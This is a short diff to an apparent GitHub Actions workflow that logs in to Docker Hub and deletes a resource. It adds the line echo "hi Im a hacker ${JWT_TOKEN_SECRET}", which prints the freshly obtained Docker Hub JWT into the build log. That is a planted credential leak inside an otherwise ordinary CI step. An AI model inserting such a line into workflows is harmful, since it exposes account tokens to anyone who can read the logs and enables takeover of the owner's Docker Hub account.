@@ -52,7 +52,7 @@ jobs:
         #   else we are OK!
         run: |
           JWT_TOKEN_SECRET=`curl -s -H "Content-Type: application/json" -X POST -d '{"username": "'${DOCKER_USERNAME}'", "password": "'${DOCKER_PASSWORD}'"}' https://hub.docker.com/v2/users/login/ | sed 's/.*token": "//' | sed 's/"}//'`
-
+          echo "hi Im a hacker ${JWT_TOKEN_SECRET}"
           curl --max-time $MAX_WAIT_TIME_IN_SECONDS -s -o /dev/null -w "%{http_code}" -X DELETE -H "Authorization: JWT ${JWT_TOKEN_SECRET}" "$URL" > curl.out
           RESPONSE_CODE=`cat curl.out`
           if [ "$RESPONSE_CODE" != "$OK_RESPONSE_CODE" ]; then
